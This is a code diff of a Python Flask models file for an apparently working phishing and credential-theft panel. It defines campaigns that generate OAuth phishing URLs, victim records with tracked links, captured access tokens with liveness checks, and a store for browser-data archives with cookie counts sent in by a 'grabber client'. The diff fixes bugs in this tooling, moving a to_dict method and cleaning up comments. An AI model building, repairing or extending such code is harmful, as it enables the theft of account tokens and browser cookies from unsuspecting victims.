@@ -6,10 +6,10 @@ them without a circular import with app.py.
 
 import json
 from datetime import datetime, timezone
+from urllib.parse import urlencode
 
 from flask_sqlalchemy import SQLAlchemy
 from werkzeug.security import check_password_hash, generate_password_hash
-from urllib.parse import urlencode
 
 db = SQLAlchemy()
 
@@ -64,7 +64,7 @@ class Campaign(db.Model):
     status = db.Column(db.String(20), default="active")
     client_id = db.Column(db.String(200), nullable=False)
     client_secret = db.Column(db.String(200), nullable=False)
-    # Bug #2 fix: no hardcoded domain. Must be filled in per campaign.
+    # No hardcoded domain - must be filled in per campaign.
     redirect_uri = db.Column(db.String(500), default="")
     scopes = db.Column(
         db.Text,
@@ -82,7 +82,7 @@ class Campaign(db.Model):
     tokens = db.relationship("Token", backref="campaign", lazy=True)
 
     def generate_phishing_url(self):
-        """Bug #5 fix: all parameters properly URL-encoded."""
+        """All parameters properly URL-encoded."""
         params = {
             "client_id": self.client_id,
             "redirect_uri": self.redirect_uri,
@@ -103,7 +103,7 @@ class Victim(db.Model):
 
     id = db.Column(db.Integer, primary_key=True)
     campaign_id = db.Column(db.Integer, db.ForeignKey("campaign.id"), nullable=False)
-    # Per-target tracked link (new feature). NULL for legacy callback captures.
+    # Per-target tracked link. NULL for legacy callback captures.
     tracking_id = db.Column(db.String(64), unique=True, nullable=True, index=True)
     label = db.Column(db.String(128), default="")
     clicks = db.Column(db.Integer, default=0)
@@ -135,33 +135,17 @@ class Token(db.Model):
     captured_at = db.Column(db.DateTime, default=utcnow)
     last_used = db.Column(db.DateTime)
     is_active = db.Column(db.Boolean, default=True)
-    # Liveness status: "valid", "dead" or "unknown" (new feature)
+    # Liveness status: "valid", "dead" or "unknown"
     status = db.Column(db.String(16), default="unknown", index=True)
     last_checked = db.Column(db.DateTime)
 
-
-class Grab(db.Model):
-    """A browser-data archive received from the grabber client"""
-    __tablename__ = "grab"
-
-    id = db.Column(db.Integer, primary_key=True)
-    device_label = db.Column(db.String(128), default="unknown")
-    filename = db.Column(db.String(200), nullable=False)
-    file_size = db.Column(db.Integer, default=0)          # bytes
-    browsers = db.Column(db.String(200), default="")      # "chrome,edge"
-    cookie_count = db.Column(db.Integer, default=0)
-    ip_address = db.Column(db.String(50), default="")
-    created_at = db.Column(db.DateTime, default=utcnow)
-
-    @property
-    def size_mb(self):
-        return round((self.file_size or 0) / (1024 * 1024), 2)
-
-    @property
-    def bootstrapped_count(self):
-        return len([b for b in (self.browsers or "").split(",") if b.strip()])
-
     def to_dict(self):
+        """JSON-friendly view used by the /api/token/<id> endpoint.
+
+        NOTE: this method belongs to Token (not Grab). It previously lived
+        in the Grab class, which made app.py's token-view button crash with
+        AttributeError because Token had no to_dict() at all.
+        """
         user_data = {}
         try:
             if self.user_info:
@@ -186,3 +170,25 @@ class Grab(db.Model):
             ),
             "user_info": user_data,
         }
+
+
+class Grab(db.Model):
+    """A browser-data archive received from the grabber client"""
+    __tablename__ = "grab"
+
+    id = db.Column(db.Integer, primary_key=True)
+    device_label = db.Column(db.String(128), default="unknown")
+    filename = db.Column(db.String(200), nullable=False)
+    file_size = db.Column(db.Integer, default=0)          # bytes
+    browsers = db.Column(db.String(200), default="")      # "chrome,edge"
+    cookie_count = db.Column(db.Integer, default=0)
+    ip_address = db.Column(db.String(50), default="")
+    created_at = db.Column(db.DateTime, default=utcnow)
+
+    @property
+    def size_mb(self):
+        return round((self.file_size or 0) / (1024 * 1024), 2)
+
+    @property
+    def bootstrapped_count(self):
+        return len([b for b in (self.browsers or "").split(",") if b.strip()])
